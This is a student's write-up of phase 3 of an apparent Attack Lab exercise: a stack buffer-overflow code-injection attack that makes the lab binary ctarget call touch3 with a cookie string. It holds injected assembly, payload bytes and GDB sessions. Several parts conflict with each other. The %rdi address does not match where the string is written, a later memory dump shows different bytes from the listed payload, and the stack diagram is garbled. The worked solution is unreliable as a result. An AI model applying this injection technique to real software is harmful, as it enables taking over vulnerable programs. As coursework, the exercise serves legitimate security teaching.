# 4.3 Level 3
Phase 3 also involves a code injection attack, but passing a string as argument.
Within the file ctarget there is code for functions hexmatch and touch3 having the following C
representations:

```C
/* Compare string to hex represention of unsigned value 
hexmatch 函数用于比较一个无符号整数 val 的十六进制字符串表示与另一个字符串 sval 是否相等
我认为就是使用字符串 cookie 进行比对校验
*/
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable 
    计算一个随机偏移量 random() % 100，并将 s 指向 cbuf 数组中该偏移量的位置。这使得字符串 s 的起始位置在 cbuf 中是不可预测的，增加了攻击的难度。
    */
    char *s = cbuf + random() % 100;
    // 使用 sprintf 函数将无符号整数 val 转换为一个 8 个十六进制字符的字符串，并存储在 s 指向的位置。格式字符串 "%.8x" 表示将 val 格式化为 8 个十六进制字符，不足 8 个字符时前面补零
    sprintf(s, "%.8x", val);
    // 使用 strncmp 函数比较两个字符串 sval 和 s 的前 9 个字符。strncmp 返回 0 表示两个字符串在前 9 个字符内相等
    return strncmp(sval, s, 9) == 0;
}


 void touch3(char *sval)
 {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
 }
```

Your task is to get CTARGET to execute the code for touch3 rather than returning to test. You must
make it appear to touch3 as if you have passed a string representation of your cookie as its argument.

Some Advice:

- You will need to include a string representation of your cookie in your exploit string. The string should
  consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”
- Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type
  “man ascii” on any Linux machine to see the byte representations of the characters you need.
- Your injected code should set register %rdi to the address of this string.
- When functions hexmatch and strncmp are called, they push data onto the stack, overwriting
  portions of memory that held the buffer used by getbuf. As a result, you will need to be careful
  where you place the string representation of your cookie.

# Idea

1. Hijack the control flow: 
  - overwrite the return address to rsp to execute the explit code
  - inject code to push address of touch3 to stack, when rec instruction, it jumps to touch3
2. Set up the argument for touch3: 
   - set register %rdi to point to a location in memory where your injected string is stored
   - put the injected string somewhere of the stack?

in the exploit string:
    -  
    - inject a string representation of your cookie in somewhere of the stack?
    - injected code should set register %rdi to the address of this string.
  
# FAQ
## 1. How can we inject the cookies as string and where to store the string in the stack?

- Buffer Overwrite and Stack Layout:
The buffer you overflow (used by getbuf) is located on the stack. When your injected code is executed, functions such as hexmatch and strncmp are called and they push additional data onto the stack. This means that if you simply inject your cookie string at the beginning of the buffer, it might be overwritten by these pushes.

so when call touch3, the stack will overite by hexmatch and strncmp functions, so we can not put string in the stack buffer,
we need put string above the stack buffer.

- Place the Cookie String:
Decide where in your payload to place the 8-digit hexadecimal string that represents your cookie. You need to ensure that this string will remain intact (i.e. not overwritten by pushed values during the execution of functions like hexmatch and strncmp). Often, the safest place is at the very end of your payload (or in a part of the stack that will not be clobbered by subsequent pushes).

When constructing your exploit payload, you must ensure that the 8-digit hexadecimal string (your cookie) remains intact and accessible when touch3 is called.

when get into the touch3 function, we put string at %rsp + 0x8 when get into touch3
```GDB
(gdb) disas touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    %rbx,%rdx
   0x000000000040191d <+35>:    mov    $0x403138,%esi
   0x0000000000401922 <+40>:    mov    $0x1,%edi
   0x0000000000401927 <+45>:    mov    $0x0,%eax
   0x000000000040192c <+50>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    $0x3,%edi
   0x0000000000401936 <+60>:    callq  0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    %rbx,%rdx
   0x0000000000401940 <+70>:    mov    $0x403160,%esi
   0x0000000000401945 <+75>:    mov    $0x1,%edi
   0x000000000040194a <+80>:    mov    $0x0,%eax
   0x000000000040194f <+85>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    $0x3,%edi
   0x0000000000401959 <+95>:    callq  0x401d4f <fail>
   0x000000000040195e <+100>:   mov    $0x0,%edi
   0x0000000000401963 <+105>:   callq  0x400e40 <exit@plt>
End of assembler dump.


```




# Solution 

1. get the inject string
cookies: 0x59b997fa 
convert cookies to string with 8 chars
remove 0x ->                 (lower address)   5  9  b  9  9  7  f  a  (high address)
convert char to hex by ascii:                 35 39 62 39 39 37 66 61
convert to 8 bytes to value: (high address)   0x6166373939623935       (lower address)

2. get the rsp register address when return getbuf

```shell
gdb ctarget
```

```gdb
(gdb) b getbuf
(gdb) run -q
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.

(gdb) info r rsp
rsp            0x5561dca0          0x5561dca0
(gdb) n
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq   
End of assembler dump.

(gdb) info r rsp
rsp            0x5561dc78          0x5561dc78
```

0x5561dc78 to little endian
(low address):  78 dc 61 55

3. calculate the address of string
get the address for store the injected string in the stack， put string at %rsp + 0x8
%rsp + 0x8 = 0x5561dca0 + 0x8 = 0x5561dca8
%rsp + 0x4 = 0x5561dca0 + 0x4 = 0x5561dca4

4. build exploit3.s with the inject string and target address

```assembly
movl  $0x61663739, 0x2c(%rsp)  # inject 4 chars as string to the address on address + 0x4 
movl  $0x39623935, 0x28(%rsp)  # inject next 4 chars as string to the address on address + 0x0 
movb  $0,  0x30(%rsp)            # Null terminator address + 0x8 
movq  $0x5561dca0 , %rdi    # set the register %rdi to the address of injected string                   
pushq $0x4018fa          # push the address of the touch3 to stack to set return address 
ret                      # when return, go to the address of the touch3 by pop from the stack
```


5. then convert exploit3.s to hex-formatted byte sequencenc then to bytes.

```shell
# assemble the assemble file(text) to object file(binary) exploit2.o
unix> gcc -c exploit3.s

# disassemble the object file(binary) to 
unix> objdump -d exploit3.o > exploit3.d


exploit3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	c7 44 24 2c 39 37 66 	movl   $0x61663739,0x2c(%rsp)
   7:	61 
   8:	c7 44 24 28 35 39 62 	movl   $0x39623935,0x28(%rsp)
   f:	39 
  10:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
  15:	48 c7 c7 a0 dc 61 55 	mov    $0x5561dca0,%rdi
  1c:	68 fa 18 40 00       	pushq  $0x4018fa
  21:	c3                   	retq   


# get hex-formatted byte sequencenc as instruction sequence from disassemble file exploit3.d
(低地址)
c7 44 24 2c 39 37 66 61 
c7 44 24 28 35 39 62 39 
c6 44 24 30 00 48 c7 c7 
a0 dc 61 55 68 fa 18 40 
00 c3
#（高地址）


```


6. add  the rsp address to exploit3_.d
(低地址)
c7 44 24 2c 39 37 66 61 
c7 44 24 28 35 39 62 39 
c6 44 24 30 00 48 c7 c7 
a0 dc 61 55 68 fa 18 40 
00 c3 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00
(高地址)

getbuf stack frame should be:
00 00 00 55 61 dc 78    -> rsp 地址       
+-----------------------------+ <-- 高地址（栈底方向）
00 00 00 00 00 00 00 00                  	
00 00 00 00 00 00 00 00 
00 00 00 00 00  
00 00 00 
                404 c7
+-----------------------------+ <-- 低地址 当前栈顶（%rsp 指向 buf 起始地址）

1. convert exploit3_.d to raw format
```shell
cat exploit3_.d | ./hex2raw > raw3.txt
```

##  Run progrom with inject assemble code(exploit code) 

```shell
./ctarget -q < raw3.txt


# GDB
gdb ctarget
```GDB
(gdb) b getbuf
(gdb) b touch3
(gdb) run -q < raw3.txt
(gdb) disas
(gdb) n
(gdb) disas
Dump of assembler code for function touch3:
=> 0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    %rbx,%rdx
   0x000000000040191d <+35>:    mov    $0x403138,%esi
   0x0000000000401922 <+40>:    mov    $0x1,%edi
   0x0000000000401927 <+45>:    mov    $0x0,%eax
   0x000000000040192c <+50>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    $0x3,%edi
   0x0000000000401936 <+60>:    callq  0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    %rbx,%rdx
   0x0000000000401940 <+70>:    mov    $0x403160,%esi
   0x0000000000401945 <+75>:    mov    $0x1,%edi
   0x000000000040194a <+80>:    mov    $0x0,%eax
   0x000000000040194f <+85>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    $0x3,%edi
   0x0000000000401959 <+95>:    callq  0x401d4f <fail>
   0x000000000040195e <+100>:   mov    $0x0,%edi
   0x0000000000401963 <+105>:   callq  0x400e40 <exit@plt>
End of assembler dump.

(gdb) x/8xb $rsp       # 显示 rsp 指向的 8 个字节的内容。
0x5561dc78:     0xc7    0x44    0x24    0x08    0x39    0x37    0x66    0x61
(gdb) x/8xb ($rsp + 8) # 查看 rsp + 8 字节的内存内容
0x5561dc80:     0xc7    0x44    0x24    0x04    0x35    0x39    0x62    0x39
(gdb) x/8xb ($rsp+16)
0x5561dc88:     0x48    0x8b    0x7c    0x24    0x08    0x68    0xfa    0x18
(gdb) x/8xb ($rsp+24)
0x5561dc90:     0x40    0x00    0xc3    0x00    0x00    0x00    0x00    0x00
(gdb) x/8xb ($rsp+32)
0x5561dc98:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00

(gdb) c
(gdb) disas
(gdb) disas
Dump of assembler code for function touch3:
=> 0x00000000004018fa <+0>:     push   %rbx
   0x00000000004018fb <+1>:     mov    %rdi,%rbx
   0x00000000004018fe <+4>:     movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:    mov    %rdi,%rsi
   0x000000000040190b <+17>:    mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
   0x0000000000401916 <+28>:    test   %eax,%eax
   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
   0x000000000040191a <+32>:    mov    %rbx,%rdx
   0x000000000040191d <+35>:    mov    $0x403138,%esi
   0x0000000000401922 <+40>:    mov    $0x1,%edi
   0x0000000000401927 <+45>:    mov    $0x0,%eax
   0x000000000040192c <+50>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:    mov    $0x3,%edi
   0x0000000000401936 <+60>:    callq  0x401c8d <validate>
   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:    mov    %rbx,%rdx
   0x0000000000401940 <+70>:    mov    $0x403160,%esi
   0x0000000000401945 <+75>:    mov    $0x1,%edi
   0x000000000040194a <+80>:    mov    $0x0,%eax
   0x000000000040194f <+85>:    callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:    mov    $0x3,%edi
   0x0000000000401959 <+95>:    callq  0x401d4f <fail>
   0x000000000040195e <+100>:   mov    $0x0,%edi
   0x0000000000401963 <+105>:   callq  0x400e40 <exit@plt>
End of assembler dump.

(gdb) x/xb 0x5561dca8
0x5561dca8:     0x39

```